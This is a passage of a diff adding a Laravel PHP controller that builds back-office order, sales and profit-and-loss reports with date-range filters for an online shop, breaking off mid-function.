+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            }
+
+            $data['total_order'] = $data['total_order']->where('order_assigns.employee_id', $request->input('emp_id'));
+            $data['total_hold_order'] = $data['total_hold_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 0]]);
+            $data['total_deliver_order'] = $data['total_deliver_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 1]]);
+            $data['total_process_order'] = $data['total_process_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 2]]);
+            $data['total_pend_pay_order'] = $data['total_pend_pay_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 3]]);
+            $data['total_cancel_order'] = $data['total_cancel_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 4]]);
+            $data['total_pending_delivery_order'] = $data['total_pending_delivery_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 5]]);
+            $data['total_on_delivery_order'] = $data['total_on_delivery_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 6]]);
+            $data['total_return_order'] = $data['total_return_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 7]]);
+            $data['total_courier_hold_order'] = $data['total_courier_hold_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 8]]);
+            $data['total_nr_1_order'] = $data['total_nr_1_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 9]]);
+            $data['total_nr_2_order'] = $data['total_nr_2_order']->where([['order_assigns.employee_id', $request->input('emp_id')], ['status', 10]]);
+
+            $data['orders'] = $data['orders']->with('get_products', 'get_courier', 'get_assigned')->whereHas('get_assigned', function ($qry) use ($emp_id) {
+                $qry->where('employee_id', $emp_id);
+            });
+
+            if ($request->input('status') != null) {
+                $data['orders'] = $data['orders']->where('status', $request->input('status'));
+            }
+
+            if ($request->input('query')) {
+                $data['orders']->where('customer_phone', 'LIKE', "%{$request->input('query')}%");
+                $data['orders']->orWhere('customer_name', 'LIKE', "%{$request->input('query')}%");
+                $data['orders']->orWhere('invoice_id', 'LIKE', "%{$request->input('query')}%");
+
+                $data['orders']->orWhereHas('get_products', function ($p) use ($query) {
+                    $p->join('products', 'products.id', 'order_products.product_id')->where('name', 'LIKE', "%{$query}%");
+                });
+            }
+
+            $data['total_order'] = $data['total_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_hold_order'] = $data['total_hold_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_deliver_order'] = $data['total_deliver_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_process_order'] = $data['total_process_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_pend_pay_order'] = $data['total_pend_pay_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_cancel_order'] = $data['total_cancel_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_pending_delivery_order'] = $data['total_pending_delivery_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_on_delivery_order'] = $data['total_on_delivery_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_return_order'] = $data['total_return_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_courier_hold_order'] = $data['total_courier_hold_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_nr_1_order'] = $data['total_nr_1_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            $data['total_nr_2_order'] = $data['total_nr_2_order']->leftJoin('orders', 'orders.id', 'order_assigns.order_id')->count();
+            //dd($data['total_order']);
+
+            $data['count'] = $data['orders']->get()->count();
+            $data['orders'] = $data['orders']->orderBy('id', 'desc')->paginate($paginate);
+            $data['orders']->appends(['paginate' => $paginate, 'emp_id' => $emp_id]);
+        } else {
+            $data['total_order'] = 0;
+            $data['total_hold_order'] = 0;
+            $data['total_deliver_order'] = 0;
+            $data['total_process_order'] = 0;
+            $data['total_pend_pay_order'] = 0;
+            $data['total_cancel_order'] = 0;
+            $data['total_pending_delivery_order'] = 0;
+            $data['total_on_delivery_order'] = 0;
+            $data['total_return_order'] = 0;
+            $data['total_courier_hold_order'] = 0;
+            $data['total_nr_1_order'] = 0;
+            $data['total_nr_2_order'] = 0;
+            $data['orders'] = [];
+        }
+        //dd($data['orders']);
+        return view('backEnd.admin.reports.employee_orders.index', compact('data', 'emp_id', 'status'));
+    }
+
+    public function orderStatusP()
+    {
+        $products = DB::table('order_products')
+            ->select('order_products.product_id')
+            ->groupBy('order_products.product_id')
+            ->pluck('product_id')->toArray();
+
+        foreach ($products as $product) {
+            $total_order[$product] = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where('order_products.product_id', $product)
+                ->count();
+        }
+        arsort($total_order);
+        $total_order = array_keys($total_order);
+        foreach ($total_order as $key => $product) {
+            $prod_name = DB::table('products')->where('id', $product)->first()->name;
+            $total_process_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 2]])
+                ->count();
+            $total_nr_1_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 9]])
+                ->count();
+            $total_nr_2_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 10]])
+                ->count();
+            $total_hold_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 0]])
+                ->count();
+            $total_cancel_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 4]])
+                ->count();
+            $total_pend_pay_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 3]])
+                ->count();
+            $total_pend_delivery_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 5]])
+                ->count();
+            $total_on_delivery_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 6]])
+                ->count();
+            $total_courier_hold_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 8]])
+                ->count();
+            $total_return_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 7]])
+                ->count();
+            $total_deliver_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where([['order_products.product_id', $product], ['orders.status', 1]])
+                ->count();
+            $total_order = DB::table('order_products')
+                ->join('orders', 'order_products.order_id', 'orders.id')
+                ->where('order_products.product_id', $product)
+                ->count();
+            $total_active = ($total_pend_delivery_order + $total_pend_pay_order + $total_process_order);
+            $data[] = [
+                $key => $prod_name,
+                [
+                    'total_order' => $total_order,
+                    'total_active' => $total_active,
+                    'total_process_order' => $total_process_order,
+                    'total_nr_1_order' => $total_nr_1_order,
+                    'total_nr_2_order' => $total_nr_2_order,
+                    'total_hold_order' => $total_hold_order,
+                    'total_cancel_order' => $total_cancel_order,
+                    'total_pend_pay_order' => $total_pend_pay_order,
+                    'total_pend_delivery_order' => $total_pend_delivery_order,
+                    'total_on_delivery_order' => $total_on_delivery_order,
+                    'total_courier_hold_order' => $total_courier_hold_order,
+                    'total_return_order' => $total_return_order,
+                    'total_deliver_order' => $total_deliver_order,
+                ],
+            ];
+        }
+        return view('backEnd.admin.reports.order_status_p.index', compact('data'));
+    }
+
+    public function ordersProduct(Request $request)
+    {
+        if ($request->input('paginate') != null) {
+            $paginate = $request->input('paginate');
+        } else {
+            $paginate = 10;
+        }
+
+        $pr = DB::table('order_products')
+            ->select('order_products.product_id')
+            ->groupBy('order_products.product_id')
+            ->pluck('product_id')->toArray();
+
+        $products = [];
+        foreach ($pr as $it) {
+            $products[$it] = DB::table('products')
+                ->where('id', $it)
+                ->first()->name;
+        }
+        //dd($products);
+        //dd($request->input('status'));
+        $custom_range = $request->input('custom_range');
+        $prod_id = $request->input('prod_id');
+        $status = $request->input('status');
+        if ($request->input('prod_id')) {
+            $data['total_order'] = OrderProduct::query();
+            $data['total_hold_order'] = OrderProduct::query();
+            $data['total_deliver_order'] = OrderProduct::query();
+            $data['total_process_order'] = OrderProduct::query();
+            $data['total_pend_pay_order'] = OrderProduct::query();
+            $data['total_cancel_order'] = OrderProduct::query();
+            $data['total_pending_delivery_order'] = OrderProduct::query();
+            $data['total_on_delivery_order'] = OrderProduct::query();
+            $data['total_return_order'] = OrderProduct::query();
+            $data['total_courier_hold_order'] = OrderProduct::query();
+            $data['total_nr_1_order'] = OrderProduct::query();
+            $data['total_nr_2_order'] = OrderProduct::query();
+            $data['orders'] = Order::query();
+
+            if ($custom_range == 'today') {
+                $custom_range = Carbon::today()->toDateTimeString();
+
+                $data['total_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_process_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_return_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereDate('orders.created_at', $custom_range);
+
+                $data['orders']->whereDate('created_at', $custom_range);
+            } elseif ($custom_range == 'yesterday') {
+                $custom_range = Carbon::yesterday()->toDateTimeString();
+
+                $data['total_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_process_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_return_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereDate('orders.created_at', $custom_range);
+
+                $data['orders']->whereDate('created_at', $custom_range);
+            } elseif ($custom_range == 'last_7_days') {
+                $custom_range = Carbon::now()->subDays(7)->toDateTimeString();
+
+                $data['total_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_hold_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_deliver_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_process_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_pend_pay_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_cancel_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_pending_delivery_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_on_delivery_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_return_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_courier_hold_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_nr_1_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_nr_2_order']->where('orders.created_at', '>=', $custom_range);
+
+                $data['orders']->where('created_at', '>=', $custom_range);
+            } elseif ($custom_range == 'this_month') {
+                $custom_range = Carbon::now()->month;
+
+                $data['total_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_process_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_return_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereMonth('orders.created_at', $custom_range);
+
+                $data['orders']->whereMonth('created_at', $custom_range);
+            } elseif ($custom_range == 'last_month') {
+                $sd = Carbon::now()->subMonth()->startOfMonth()->toDateTimeString();
+                $ed = Carbon::now()->subMonth()->endOfMonth()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            } elseif ($custom_range == 'last_6_months') {
+                $sd = Carbon::now()->subMonths(6)->startOfMonth()->toDateTimeString();
+                $ed = Carbon::now()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            } elseif ($request->input('start_date') && $request->input('end_date')) {
+                $sd = Carbon::parse($request->input('start_date'))->startOfDay()->toDateTimeString();
+                $ed = Carbon::parse($request->input('end_date'))->endOfDay()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            }
+
+            $data['total_order'] = $data['total_order']->where('product_id', $request->input('prod_id'));
+            $data['total_hold_order'] = $data['total_hold_order']->where([['product_id', $request->input('prod_id')], ['status', 0]]);
+            $data['total_deliver_order'] = $data['total_deliver_order']->where([['product_id', $request->input('prod_id')], ['status', 1]]);
+            $data['total_process_order'] = $data['total_process_order']->where([['product_id', $request->input('prod_id')], ['status', 2]]);
+            $data['total_pend_pay_order'] = $data['total_pend_pay_order']->where([['product_id', $request->input('prod_id')], ['status', 3]]);
+            $data['total_cancel_order'] = $data['total_cancel_order']->where([['product_id', $request->input('prod_id')], ['status', 4]]);
+            $data['total_pending_delivery_order'] = $data['total_pending_delivery_order']->where([['product_id', $request->input('prod_id')], ['status', 5]]);
+            $data['total_on_delivery_order'] = $data['total_on_delivery_order']->where([['product_id', $request->input('prod_id')], ['status', 6]]);
+            $data['total_return_order'] = $data['total_return_order']->where([['product_id', $request->input('prod_id')], ['status', 7]]);
+            $data['total_courier_hold_order'] = $data['total_courier_hold_order']->where([['product_id', $request->input('prod_id')], ['status', 8]]);
+            $data['total_nr_1_order'] = $data['total_nr_1_order']->where([['product_id', $request->input('prod_id')], ['status', 9]]);
+            $data['total_nr_2_order'] = $data['total_nr_2_order']->where([['product_id', $request->input('prod_id')], ['status', 10]]);
+
+            $data['orders'] = $data['orders']->with('get_products', 'get_courier', 'get_assigned')->whereHas('get_products', function ($qry) use ($prod_id) {
+                $qry->join('products', 'products.id', 'order_products.product_id')->where('products.id', $prod_id);
+            });
+
+            if ($request->input('status') != null) {
+                $data['orders'] = $data['orders']->where('status', $request->input('status'));
+            }
+
+            $data['total_order'] = $data['total_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_hold_order'] = $data['total_hold_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_deliver_order'] = $data['total_deliver_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_process_order'] = $data['total_process_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_pend_pay_order'] = $data['total_pend_pay_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_cancel_order'] = $data['total_cancel_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_pending_delivery_order'] = $data['total_pending_delivery_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_on_delivery_order'] = $data['total_on_delivery_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_return_order'] = $data['total_return_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_courier_hold_order'] = $data['total_courier_hold_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_nr_1_order'] = $data['total_nr_1_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            $data['total_nr_2_order'] = $data['total_nr_2_order']->leftJoin('orders', 'orders.id', 'order_products.order_id')->count();
+            //dd($data['total_order']);
+
+            $data['count'] = $data['orders']->count();
+            $data['orders'] = $data['orders']->orderBy('id', 'desc')->paginate($paginate);
+            $data['orders']->appends(['paginate' => $paginate, 'prod_id' => $prod_id]);
+            //dd($data['orders']);
+        } else {
+            $data['total_order'] = 0;
+            $data['total_hold_order'] = 0;
+            $data['total_deliver_order'] = 0;
+            $data['total_process_order'] = 0;
+            $data['total_pend_pay_order'] = 0;
+            $data['total_cancel_order'] = 0;
+            $data['total_pending_delivery_order'] = 0;
+            $data['total_on_delivery_order'] = 0;
+            $data['total_return_order'] = 0;
+            $data['total_courier_hold_order'] = 0;
+            $data['total_nr_1_order'] = 0;
+            $data['total_nr_2_order'] = 0;
+            $data['orders'] = [];
+        }
+        //dd($data['orders']);
+        return view('backEnd.admin.reports.orders_product.index', compact('data', 'products', 'status', 'prod_id'));
+    }
+
+    public function salesReport(Request $request)
+    {
+        $custom_range = $request->input('custom_range');
+        $data = OrderProduct::query()->with('get_product')
+            ->join('orders', 'orders.id', 'order_products.order_id')
+            ->select('order_products.*', 'orders.created_at', 'orders.discount');
+        $total_sales = 0;
+        $total_discounts = 0;
+
+        // dd($request->all());
+        if ($custom_range == 'today') {
+            $custom_range = Carbon::today()->toDateTimeString();
+            $data->whereDate('orders.created_at', $custom_range);
+            // dd($data->get());
+        } elseif ($custom_range == 'yesterday') {
+            $custom_range = Carbon::yesterday()->toDateTimeString();
+
+            $data->whereDate('orders.created_at', $custom_range);
+        } elseif ($custom_range == 'last_7_days') {
+            $sd = Carbon::now()->subDays(7)->startOfDay()->toDateTimeString();
+            $ed = Carbon::now()->toDateTimeString();
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'this_month') {
+            $sd = Carbon::now()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'last_month') {
+            $sd = Carbon::now()->subMonth()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->subMonth()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'last_6_months') {
+            $sd = Carbon::now()->subMonths(6)->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($request->input('start_date') && $request->input('end_date')) {
+            $sd = Carbon::parse($request->input('start_date'))->startOfDay()->toDateTimeString();
+            $ed = Carbon::parse($request->input('end_date'))->endOfDay()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        }
+
+        $orders = $data->where('status', 1)->get()->groupBy('product_id');
+        foreach ($orders as $order) {
+            $d[] = [
+                'product_name' => $order->first()->get_product->name,
+                'sales' => $order->sum('price'),
+                'discount' => $order->sum('discount'),
+            ];
+        }
+        //dd($d);
+        foreach ($d as $dd) {
+            $total_sales += $dd['sales'];
+            $total_discounts += $dd['discount'];
+        }
+
+        return view('backEnd.admin.reports.sales.sales_report', compact('total_sales', 'total_discounts'));
+
+    }
+
+    public function profitLoss(Request $request)
+    {
+        // dd($request->all());
+        $custom_range = $request->input('custom_range');
+        $total_dollar = $request->input('total_dollar') ?? 0;
+        $dollar_rate = $request->input('dollar_rate') ?? 0;
+        $return_percentage = $request->input('return_percentage') ?? 0;
+        $product_id = $request->input('product_id');
+        $status = $request->input('status');
+        $dollar_cost = $total_dollar * $dollar_rate;
+        // dd($product_id);
+
+        $data = Order::query()->with('get_products.get_product');
+        $products = Product::latest()->get();
+        // dd ($data);
+        $total_sales = 0;
+        $total_discounts = 0;
+
+        // dd($total_dollar,$dollar_rate,$packaging_cost,$return_percentage);
+        if ($custom_range == 'today') {
+            $custom_range = Carbon::today()->toDateTimeString();
+            $data->whereDate('orders.created_at', $custom_range);
+            // $count = $data->where('status', 1)->count();
+            // $orders = $data->where('status', 1)->get();
+        } elseif ($custom_range == 'yesterday') {
+            $custom_range = Carbon::yesterday()->toDateTimeString();
+            $data->whereDate('orders.created_at', $custom_range);
+        } elseif ($custom_range == 'last_7_days') {
+            $sd = Carbon::now()->subDays(7)->startOfDay()->toDateTimeString();
+            $ed = Carbon::now()->toDateTimeString();
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'this_month') {
+            $sd = Carbon::now()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'last_month') {
+            $sd = Carbon::now()->subMonth()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->subMonth()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($custom_range == 'last_6_months') {
+            $sd = Carbon::now()->subMonths(6)->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->toDateTimeString();
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        } elseif ($request->input('start_date') && $request->input('end_date')) {
+            $sd = Carbon::parse($request->input('start_date'))->startOfDay()->toDateTimeString();
+            $ed = Carbon::parse($request->input('end_date'))->endOfDay()->toDateTimeString();
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+        }
+        // dd($data->get());
+
+        $orders = $data->when($product_id, function ($q) use ($product_id) {
+            $q->whereHas('get_products', function ($q) use ($product_id) {
+                $q->where('product_id', $product_id);
+            });
+        })->when($status, function ($q) use ($status) {
+            $q->where('status', $status);
+        })->get();
+        // dd($orders);
+        $count = $data->count();
+        // dd($count);
+        if ($count > 0) {
+            $cost_per_order = $total_dollar / $count;
+        } else {
+            $cost_per_order = 0; // or handle the case where $count is zero appropriately
+        }
+        $product_purchase_cost = 0;
+        $total_sales = 0;
+        $product_packaging_cost = 0;
+        $discount = 0;
+        $shipping_cost = 0;
+        $courier_charge_cost = 0;
+        foreach ($orders as $order) {
+            // dd($order->courier_charge_cost);
+            if ($product_id) {
+                if ($order->discount > 0) {
+                    $discount += $order->get_products->where('product_id', $product_id)->first()->get_order->discount / count($order->get_products);
+                } else {
+                    $discount = 0;
+                }
+                // dd($discount);
+                $shipping_cost += $order->get_products->where('product_id', $product_id)->first()->get_order->shipping_cost / count($order->get_products);
+                $courier_charge_cost += $order->get_products->where('product_id', $product_id)->first()->get_order->courier_charge_cost / count($order->get_products);
+
+                $price = $order->get_products->where('product_id', $product_id)->first()->price;
+                $qty = $order->get_products->where('product_id', $product_id)->first()->qty;
+                $total_sales += $price * $qty;
+                $product_purchase_cost += $order->get_products->where('product_id', $product_id)->first()->get_product->purchase_cost * $qty;
+                $product_packaging_cost += $order->get_products->where('product_id', $product_id)->first()->get_product->packaging_cost * $qty;
+
+                // dd($total_sales);
+            } else {
+                if ($order->discount > 0) {
+                    $discount += $order->discount;
+                } else {
+                    $discount = 0;
+                }
+                $shipping_cost += $order->shipping_cost;
+                $courier_charge_cost += $order->courier_charge_cost;
+                $total_sales += $order->select(DB::raw('SUM(sub_total) as total_sales'))->where('id', $order->id)->first()->total_sales;
+                foreach ($order->get_products as $product) {
+                    // dd($product->get_product);
+                    $product_purchase_cost += $product->get_product->purchase_cost * $product->qty;
+                    $product_packaging_cost += $product->get_product->packaging_cost * $product->qty;
+                }
+            }
+        }
+
+        $grand_total = ($total_sales + $shipping_cost) - $discount;
+        $courier_charge_profit = $shipping_cost - $courier_charge_cost;
+        // dd( $shipping_cost );
+        $return_cost = ($grand_total * $return_percentage) / 100;
+        // dd($return_cost);
+        $net_sales = $grand_total - $return_cost;
+        $profit_loss = $net_sales - ($dollar_cost + $product_purchase_cost + $product_packaging_cost + $courier_charge_cost);
+        // dd($courier_charge_cost);
+        return view('backEnd.admin.reports.profit_loss', compact('dollar_cost', 'cost_per_order', 'product_purchase_cost', 'net_sales', 'product_packaging_cost', 'products', 'courier_charge_profit', 'grand_total', 'profit_loss', 'courier_charge_cost', 'return_cost', 'return_percentage'));
+    }
+
+
+    public function salesReportPrint(Request $request)
+    {
+        //dd($request->all());
+        $custom_range = $request->input('custom_range');
+        $data = OrderProduct::query()->with('get_product')
+            ->join('orders', 'orders.id', 'order_products.order_id')
+            ->select('order_products.*', 'orders.created_at', 'orders.discount');
+        $cr = '';
+        $s_date = '';
+        $e_date = '';
+        //dd($request->all());
+        if ($custom_range == 'today') {
+            $custom_range = Carbon::today()->toDateTimeString();
+            $data->whereDate('orders.created_at', $custom_range);
+
+            //show data into report print
+            $cr = date('d/m/Y', strtotime($custom_range));
+        } elseif ($custom_range == 'yesterday') {
+            $custom_range = Carbon::yesterday()->toDateTimeString();
+
+            $data->whereDate('orders.created_at', $custom_range);
+
+            //show data into report print
+            $cr = date('d/m/Y', strtotime($custom_range));
+        } elseif ($custom_range == 'last_7_days') {
+            $sd = Carbon::now()->subDays(7)->startOfDay()->toDateTimeString();
+            $ed = Carbon::now()->toDateTimeString();
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+
+            //show data into report print
+            $s_date = date('d/m/Y', strtotime($sd));
+            $e_date = date('d/m/Y', strtotime($ed));
+        } elseif ($custom_range == 'this_month') {
+            $sd = Carbon::now()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+
+            //show data into report print
+            $s_date = date('d/m/Y', strtotime($sd));
+            $e_date = date('d/m/Y', strtotime($ed));
+        } elseif ($custom_range == 'last_month') {
+            $sd = Carbon::now()->subMonth()->startOfMonth()->toDateTimeString();
+            $ed = Carbon::now()->subMonth()->endOfMonth()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+
+            //show data into report print
+            $s_date = date('d/m/Y', strtotime($sd));
+            $e_date = date('d/m/Y', strtotime($ed));
+        } elseif ($custom_range == 'last_6_months') {
+            $sd = Carbon::now()->subMonths(6)->startOfMonth()->toDateTimeString();
